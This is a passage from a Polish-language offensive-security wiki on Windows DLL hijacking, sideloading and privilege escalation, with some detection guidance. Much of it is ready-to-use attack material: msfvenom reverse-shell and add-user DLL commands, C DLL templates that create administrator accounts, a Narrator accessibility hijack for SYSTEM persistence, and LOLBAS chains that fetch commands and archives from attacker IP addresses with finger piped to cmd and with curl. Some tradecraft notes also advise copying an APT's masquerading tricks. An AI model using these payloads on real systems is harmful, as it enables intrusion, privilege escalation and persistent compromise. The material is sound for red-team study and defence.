- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji z pełnym zaufaniem ładować niepodpisane lub zmodyfikowane zestawy bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher policy do nowszych zestawów.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** zapewnia bardziej deterministyczny wybór środowiska uruchomieniowego.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** na podstawie konfiguracji, zamiast żeby implant modyfikował w pamięci `EtwEventWrite`.

Schemat działania zaobserwowany w niedawnych kampaniach:
- Etap 1 zapisuje `setup.exe`, `setup.exe.config` i lokalne zestawy.
- Etap 2 kopiuje je do wiarygodnie wyglądającego katalogu **aktualizacji w AppData**, zmienia nazwę hosta na coś w rodzaju `update.exe` i ponownie go uruchamia za pomocą **zaplanowanego zadania**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwany proces nadrzędny `svchost.exe` uruchomiony przez Harmonogram zadań) przed załadowaniem końcowego pliku DLL/eksportu RAT.

Pomysły na wykrywanie:
- Podpisane lub inne legalne **pliki wykonywalne .NET** uruchomione z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Zaplanowane zadania ponownie uruchamiające pliki binarne aktualizacji o zmienionej nazwie z katalogów **`%LOCALAPPDATA%`** lub katalogów aplikacji, takich jak `\bin\update\`.
- Łańcuchy procesów nadrzędnych i potomnych, w których zaplanowane zadanie uruchamia zaufany host .NET, który natychmiast ładuje zestawy spoza katalogu dostawcy z własnego katalogu.

#### Wyjątki od kolejności wyszukiwania dll opisane w dokumentacji Windows

W dokumentacji Windows opisano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **plik DLL o tej samej nazwie co już załadowany do pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego sprawdza przekierowania i manifest, a następnie domyślnie używa pliku DLL już znajdującego się w pamięci. **W tym scenariuszu system nie wyszukuje pliku DLL**.
- Jeśli plik DLL zostanie rozpoznany jako **znany plik DLL** dla bieżącej wersji Windows, system użyje jego wersji tego znanego pliku DLL wraz ze wszystkimi zależnymi plikami DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych plików DLL.
- Jeśli **plik DLL ma zależności**, wyszukiwanie zależnych plików DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkowy plik DLL został znaleziony przy użyciu pełnej ścieżki.

### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działać z **innymi uprawnieniami** (ruch poziomy lub boczny) i któremu **brakuje pliku DLL**.
- Upewnij się, że masz **uprawnienia do zapisu** w dowolnym **katalogu**, w którym będzie **wyszukiwany plik DLL**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w ścieżce systemowej.

Takie warunki rzadko występują domyślnie: uprzywilejowanym plikom wykonywalnym zwykle nie brakuje zależności DLL, a zwykli użytkownicy zazwyczaj nie mogą zapisywać w katalogach ścieżek wyszukiwania systemu. Błędnie skonfigurowane środowiska mogą jednak spełniać oba te warunki.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Choć jego głównym celem jest obejście UAC, zawiera PoC hijackingu DLL dla określonych wersji Windows, które często można dostosować do znalezionego zapisywalnego katalogu.

Zauważ, że możesz **sprawdzić swoje uprawnienia do folderu**, wykonując:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Oraz **sprawdź uprawnienia do wszystkich folderów w PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Możesz również sprawdzić importy pliku wykonywalnego i eksporty biblioteki DLL za pomocą:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Aby zapoznać się z pełnym przewodnikiem na temat **wykorzystania DLL Hijacking do eskalacji uprawnień** przy możliwości zapisu w **folderze System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze znajdującym się w systemowym PATH.\
Inne przydatne zautomatyzowane narzędzia do wykrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

Jeśli znajdziesz scenariusz podatny na wykorzystanie, jedną z najważniejszych rzeczy potrzebnych do jego skutecznego wykorzystania będzie **utworzenie biblioteki DLL eksportującej co najmniej wszystkie funkcje, które plik wykonywalny będzie z niej importować**. Warto jednak pamiętać, że DLL Hijacking przydaje się do [**eskalacji z poziomu Medium Integrity do High (z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z [**High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia prawidłowej biblioteki DLL** znajdziesz w tym opracowaniu na temat DLL Hijacking, skupionym na jego wykorzystaniu do uruchamiania kodu: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych przykładów kodu DLL**, które mogą posłużyć jako **szablony** lub pomóc w utworzeniu **biblioteki DLL eksportującej niewymagane funkcje**.

## **Tworzenie i kompilowanie bibliotek DLL**

### **DLL Proxifying**

**Proxy DLL** to zasadniczo biblioteka DLL, która potrafi **wykonać twój złośliwy kod po załadowaniu**, a jednocześnie **udostępniać funkcje** i **działać zgodnie z oczekiwaniami**, **przekazując wszystkie wywołania do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz poddać proxifyingowi, a następnie **wygenerować proxified DLL**; możesz też **wskazać bibliotekę DLL** i **wygenerować proxified DLL**.

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Uzyskaj meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Utwórz użytkownika (x86 — nie widziałem wersji x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Własna

W wielu przypadkach skompilowana przez Ciebie biblioteka DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozwiązać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w języku C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia wątku</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT DLL z inicjalizacją wyzwalaną przez eksport

Samowystarczalna **biblioteka współdzielona .NET NativeAOT** może służyć jako umieszczona natywna DLL bez implementowania jawnej funkcji `DllMain`. Wyeksportuj statyczne metody C# za pomocą `[UnmanagedCallersOnly(EntryPoint = "...")]`; gdy natywny host wywoła jeden z tych wygenerowanych przez kompilator punktów wejścia, NativeAOT zainicjalizuje moduł, a metoda `[ModuleInitializer]` uruchomi się przed wykonaniem wyeksportowanego kodu C#.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup> Wynik nie wymaga osobno zainstalowanego środowiska uruchomieniowego .NET.

DLL nadal musi mieć **nazwy eksportów i sygnatury zgodne z ABI**, których faktycznie używa wybrany host. Minimalne funkcje zastępcze mogą wystarczyć do wyzwolenia inicjalizacji, ale brakujące eksporty mogą uniemożliwić załadowanie DLL, a nieprawidłowa sygnatura może spowodować uszkodzenie danych podczas wywołania. Wylicz importy hosta i zweryfikuj wynik za pomocą `dumpbin /exports payload.dll`, zanim zmienisz nazwę pliku wynikowego na nazwę zależności oczekiwaną przez hosta.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimalna eksportowana DLL NativeAOT</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Skonfiguruj projekt jako samowystarczalną natywną bibliotekę współdzieloną systemu Windows:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Umieść przemianowaną bibliotekę DLL obok skopiowanego, podatnego pliku wykonywalnego i uruchom hosta ścieżką kodu, która wywołuje zgodny eksport. To podejście z inicjalizatorem pozwala uniknąć umieszczania złożonych operacji bezpośrednio w `DllMain`, ale warunki wstępne sideloadingu pozostają bez zmian: loader musi rozwiązać zależność na podstawie nazwy, wybrać katalog aplikacji i nie może najpierw znaleźć jej w KnownDLLs, wśród już załadowanych modułów, przez przekierowanie SxS ani z użyciem ograniczających flag `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Konwencjonalne szablony native znajdziesz w sekcji [Windows C payloads](../windows-c-payloads.md). Sideloadowany first stage może następnie wykonać [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), ale jest to osobna technika wstrzykiwania, a nie element rozwiązywania nazw DLL.

## Wykrywanie: ładowanie bibliotek DLL podszywających się pod inne pliki

Elastic Defend 9.5.0 wzbogaca zdarzenie ładowania biblioteki o `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`, gdy załadowany plik nie ma podpisu Microsoftu, a jego nazwa koliduje z zapisaną w pamięci podręcznej przez Elastic listą nazw bibliotek DLL Windows/systemowych. Dzięki temu analiza nazw plików, lokalizacji systemowych i podpisów odbywa się w sensorze endpointu, a podstawowe zapytanie EQL można zatem uprościć do:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Traktuj wzbogacenie danych jako wartościowy punkt pivotu, a nie samodzielny dowód. Zwiększaj poziom pewności, gdy podpisany host ładuje DLL z własnego katalogu **zapisywalnego przez użytkownika**, DLL jest niepodpisana/niezaufana, a `dll.Ext.relative_file_creation_time` wskazuje, że została utworzona krótko przed załadowaniem. Wykluczenia ograniczaj do dokładnego zestawu: wydawca + proces hosta + ścieżka instalacji; nie wyciszaj globalnie kolidującej nazwy DLL, ponieważ legalne instalatory i aplikacje mogą dostarczać prywatne biblioteki o nazwach podobnych do systemowych.<sup>[[26]](#references)</sup>

Na sensorach bez tych wzbogaconych danych przybliż to zachowanie, korelując kolidującą nazwę DLL z niesystemową ścieżką ładowania, brakiem podpisu Microsoft lub niezaufanym podpisem oraz krótkim odstępem między utworzeniem pliku a jego załadowaniem. Wymaga to utrzymywania aktualnego wykazu nazw DLL i wąskich wykluczeń dla `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` oraz innych zatwierdzonych ścieżek wdrażania.<sup>[[26]](#references)</sup>

## Studium przypadku: hijacking DLL lokalizacji Narrator OneCore TTS (ułatwienia dostępu/AT)

Windows Narrator.exe nadal podczas uruchamiania sprawdza przewidywalną, zależną od języka bibliotekę DLL lokalizacji, którą można przejąć w celu wykonania dowolnego kodu i uzyskania trwałości.<sup>[[7]](#references)</sup>

Kluczowe informacje
- Ścieżka sprawdzana przez program (obecne kompilacje): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze kompilacje): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore znajduje się zapisywalna, kontrolowana przez atakującego DLL, zostaje załadowana i wykonywane jest `DllMain(DLL_PROCESS_ATTACH)`. Nie są wymagane żadne eksporty.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i zaobserwuj próbę załadowania powyższej ścieżki.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Cisza OPSEC
- Naiwny hijack spowoduje odtworzenie dźwięku lub wyróżnienie elementu UI. Aby działać po cichu, po dołączeniu wylicz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Wyzwalanie i utrwalanie za pomocą konfiguracji Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Po wykonaniu powyższych poleceń uruchomienie Narratora załaduje umieszczoną DLL. Na bezpiecznym pulpicie (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.

Wykonanie jako SYSTEM wyzwalane przez RDP (ruch lateralny)
- Włącz klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.
- Wykonanie kończy się po zamknięciu sesji RDP — szybko wykonaj inject lub migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia Accessibility (AT) (np. CursorIndicator), zmodyfikować go tak, aby wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Pozwala to uruchamiać dowolny kod za pośrednictwem frameworka Accessibility.

Uwagi
- Zapis w `%windir%\System32` i modyfikowanie wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; nie są potrzebne żadne exports.

## Studium przypadku: CVE-2025-1729 - Privilege Escalation za pomocą TPQMAssistant.exe

Ten przypadek pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzone jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zaplanowane zadanie**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia katalogu**: Zapis możliwy dla `CREATOR OWNER`, co pozwala lokalnym użytkownikom umieszczać dowolne pliki.
- **Zachowanie wyszukiwania DLL**: Program najpierw próbuje załadować `hostfxr.dll` z katalogu roboczego i zapisuje „NAME NOT FOUND”, jeśli pliku brakuje, co wskazuje na priorytet wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Atakujący może umieścić w tym samym katalogu złośliwą bibliotekę `hostfxr.dll` typu stub i wykorzystać brakującą DLL, aby uzyskać wykonanie kodu w kontekście użytkownika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Przepływ ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli w chwili wykonania zadania zalogowany jest administrator, złośliwy DLL uruchomi się w sesji administratora z poziomem integralności medium.
4. Połącz standardowe techniki obejścia UAC, aby uzyskać uprawnienia SYSTEM z poziomu integralności medium.

## Studium przypadku: Dropper MSI CustomAction + DLL side-loading przez podpisany proces hosta (wsc_proxy.exe)

Cyberprzestępcy często łączą droppery oparte na MSI z DLL side-loading, aby uruchamiać payloady w zaufanym, podpisanym procesie.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera plik MSI. CustomAction uruchamia się po cichu podczas instalacji z interfejsem graficznym (np. LaunchApplication lub akcja VBScript), odtwarzając kolejny etap z osadzonych zasobów.
- Dropper zapisuje w tym samym katalogu legalny, podpisany plik EXE oraz złośliwy DLL (przykładowa para: `wsc_proxy.exe` podpisany przez Avast + kontrolowany przez atakującego `wsc.dll`).
- Po uruchomieniu podpisanego pliku EXE kolejność wyszukiwania DLL w systemie Windows powoduje załadowanie najpierw pliku `wsc.dll` z katalogu roboczego, co uruchamia kod atakującego w podpisanym procesie nadrzędnym (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
  - Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykład podejrzanego wzorca: LaunchApplication uruchamiające w tle osadzony plik.
  - W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w pliku CAB MSI:
  - Wyodrębnianie administracyjne: `msiexec /a package.msi /qb TARGETDIR=C:\out`
  - Możesz też użyć lessmsi: `lessmsi x package.msi C:\out`
  - Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction w VBScript. Typowy przebieg:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktyczny sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
  - wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować plik wsc.dll z jego katalogu, używając nazwy pliku.
  - wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- W przypadku wymagań dotyczących eksportów użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który dodatkowo uruchamia payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez host binary. Jeśli host używa ścieżek bezwzględnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność wyszukiwania i należy je uwzględnić przy wyborze host binary oraz zestawu eksportów.

## Podpisane triady + zaszyfrowane payloady (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad za pomocą **trójki plików**, która pozwala upodobnić się do legalnego oprogramowania, a jednocześnie przechowywać główny payload na dysku w postaci zaszyfrowanej:<sup>[[12]](#references)</sup>

1. **Podpisany host EXE** – nadużywane są pliki dostawców takich jak AMD, Realtek czy NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego, aby przypominał plik binarny Windows (np. `conhost.exe`), ale podpis Authenticode pozostaje prawidłowy.
2. **Złośliwy loader DLL** – umieszczany obok pliku EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL to zazwyczaj plik binarny MFC zaciemniony za pomocą frameworka ScatterBrain; jego jedynym zadaniem jest odnalezienie zaszyfrowanego bloba, odszyfrowanie go i reflectively map ShadowPad.
3. **Zaszyfrowany blob payloadu** – często przechowywany w tym samym katalogu jako `<name>.tmp`. Po zmapowaniu odszyfrowanego payloadu do pamięci loader usuwa plik TMP, aby zatrzeć ślady kryminalistyczne.

Uwagi dotyczące tradecraft:

* Zmiana nazwy podpisanego pliku EXE (z zachowaniem oryginalnej wartości `OriginalFileName` w nagłówku PE) pozwala mu podszywać się pod plik binarny Windows, a jednocześnie zachować podpis dostawcy. Warto więc naśladować praktykę Ink Dragon polegającą na umieszczaniu plików przypominających `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ plik wykonywalny pozostaje zaufany, w większości przypadków mechanizmy allowlistingu wymagają jedynie umieszczenia złośliwej DLL obok niego. Skup się na dostosowaniu loader DLL; podpisany plik nadrzędny zazwyczaj może działać bez zmian.
* Deszyfrator ShadowPad oczekuje, że blob TMP będzie znajdował się obok loadera i będzie zapisywalny, aby po mapowaniu można było wyzerować plik. Katalog musi pozostać zapisywalny do czasu załadowania payloadu; po umieszczeniu go w pamięci plik TMP można bezpiecznie usunąć ze względów OPSEC.

### Łańcuch sideloadingu LOLBAS stagera + archiwum etapowego (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, dzięki czemu jedynym niestandardowym artefaktem na dysku jest złośliwa DLL umieszczona obok zaufanego pliku EXE:<sup>[[1]](#references)</sup>

- **Loader poleceń zdalnych (Finger):** ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je do `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, umożliwiając operatorom rotację drugiego etapu po stronie serwera.

- **Wbudowane pobieranie/rozpakowywanie:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i umieść cel sideloadingu oraz DLL w losowym folderze `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` korzysta z wbudowanego w Windows narzędzia `tar`.

  - **Uruchomienie przez WMI/CIM:** Uruchom EXE za pomocą WMI, aby telemetria pokazywała proces utworzony przez CIM podczas ładowania znajdującej się obok biblioteki DLL:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Działa z plikami binarnymi, które preferują lokalne DLL-e (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Wykrywanie:** Alertuj, gdy `forfiles` występuje razem z `/p`, `/m` i `/c`; poza skryptami administratorów jest to rzadkie.


## Studium przypadku: NSIS dropper + sideloading Bitdefender Submission Wizard (Chrysalis)

Niedawna intruzja Lotus Blossom wykorzystała zaufany łańcuch aktualizacji do dostarczenia droppera spakowanego w NSIS, który umieścił DLL do sideloadingu oraz payloady uruchamiane w całości w pamięci.<sup>[[13]](#references)</sup>

Przebieg działań
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza zmienioną nazwę pliku Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy plik `log.dll` oraz zaszyfrowany blob `BluetoothService`, a następnie uruchamia plik EXE.
- Plik hosta EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` wczytuje blob przez mmap; `LogWrite` odszyfrowuje go za pomocą strumienia opartego na niestandardowym LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor jawnym shellcode’em, zwalnia dane tymczasowe i przekazuje mu sterowanie.
- Aby uniknąć IAT, loader rozwiązuje API, haszując nazwy eksportów za pomocą **bazy FNV-1a 0x811C9DC5 + liczby pierwszej 0x1000193**, a następnie stosując funkcję mieszającą w stylu Murmura (**0x85EBCA6B**) i porównując wyniki z haszami docelowymi z solą.

Główny shellcode (Chrysalis)
- Odszyfrowuje główny moduł podobny do PE, powtarzając operacje dodawania/XOR/odejmowania z kluczem `gQ2JR&9;` w pięciu przebiegach, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza ciągi nazw DLL w czasie działania za pomocą transformacji rotacji bitów/XOR dla każdego znaku, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Korzysta z drugiego mechanizmu rozwiązywania, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tablicę eksportów w blokach 4-bajtowych przy użyciu mieszania w stylu Murmura i wywołuje `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Osadzona konfiguracja i C2
- Konfiguracja znajduje się w upuszczonym pliku `BluetoothService` pod **offsetem 0x30808** (rozmiar **0x980**) i jest odszyfrowywana przez RC4 za pomocą klucza `qwhvb^435h&*7`, co ujawnia URL C2 i User-Agent.
